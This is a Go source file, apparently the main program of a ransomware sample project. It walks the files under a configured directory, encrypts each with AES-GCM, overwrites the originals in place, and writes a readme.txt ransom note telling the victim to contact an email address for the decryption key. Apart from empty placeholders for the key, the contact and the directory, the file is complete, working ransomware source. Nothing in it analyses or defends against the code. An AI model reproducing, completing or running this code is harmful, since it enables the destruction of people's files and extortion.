package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"io"
	"io/ioutil"
	"os"

	"github.com/schecthellraiser606/Ramsom_Go_Sample/explorer"
)

func main() {
	cryptoKey := "" // Insert generated Key
	contact := ""   // Insert contact email
	dir := ""       // Insert starting directory

	if cryptoKey == "" {
		panic("need crypto key! \nrun 'go run keygen/main.go' to get a crypto key")
	}

	key, err := hex.DecodeString(cryptoKey)

	if err != nil {
		panic(err)
	}

	files := explorer.MapFiles(dir)

	for _, v := range files {
		file, err := ioutil.ReadFile(v)

		if err != nil {
			continue
		}

		encrypted, err := Encrypt(file, key)

		if err != nil {
			continue
		}

		ioutil.WriteFile(v, encrypted, 0644)
	}

	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypt key."

	err = ioutil.WriteFile(os.Getenv("HOME")+dir+"/readme.txt", []byte(msg), 0644)

	if err != nil {
		panic(err)
	}
}

func Encrypt(plainText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)

	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)

	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}

	cypherText := gcm.Seal(nonce, nonce, plainText, nil)

	return cypherText, nil
}
